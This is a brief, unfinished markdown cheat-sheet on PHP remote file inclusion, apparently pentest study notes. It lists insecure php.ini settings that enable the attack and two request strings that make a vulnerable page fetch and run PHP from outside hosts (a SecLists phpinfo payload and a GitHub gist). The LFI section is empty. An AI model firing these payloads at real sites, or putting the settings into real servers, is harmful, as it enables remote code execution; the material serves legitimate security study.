# File Inclusion

## RFI

PHP_ini settings:
```ini
   safe_mode = off
   disabled_functions = N/A
   register_globals = on
   allow_url_include = on
   allow_url_fopen = on
   short_tag_open = on
   file_uploads = on
   display_errors = on
```

```
rfi.php?page=https://raw.githubusercontent.com/danielmiessler/SecLists/master/Payloads/PHPInfo/phpinfo.txt

rfi.php?page=https://gist.githubusercontent.com/FJuette/9076c392fa2ca1fa684bea118a925a91/raw/dd1b2492bb83763fd872bb85eca166d15871eb3c/rfi.php
```

## LFI

TODO
